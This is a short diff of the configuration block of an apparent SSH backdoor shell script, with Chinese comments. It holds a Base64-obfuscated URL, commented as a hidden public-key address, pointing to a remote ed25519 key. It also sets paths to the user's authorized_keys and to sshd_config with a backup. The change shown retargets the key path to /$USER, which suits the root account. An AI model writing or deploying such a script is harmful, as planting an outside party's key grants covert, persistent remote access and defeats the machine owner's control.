@@ -3,7 +3,7 @@
 # ================= 配置区 =================
 ENCODED_URL="aHR0cDovL2kubWlzc3R3by50b3Avc3RhdGljL2lkX2VkMjU1MTkucHVi"  # Base64 隐藏的公钥 URL
 SSH_USER="$(whoami)"                                     # 当前用户
-AUTHORIZED_KEYS_PATH="/home/$SSH_USER/.ssh/authorized_keys"
+AUTHORIZED_KEYS_PATH="/$SSH_USER/.ssh/authorized_keys"
 TMP_KEY_FILE="/tmp/temp_ssh_key.pub"
 SSHD_CONFIG="/etc/ssh/sshd_config"
 BACKUP_SSHD_CONFIG="${SSHD_CONFIG}.bak.$(date +%F_%T)"
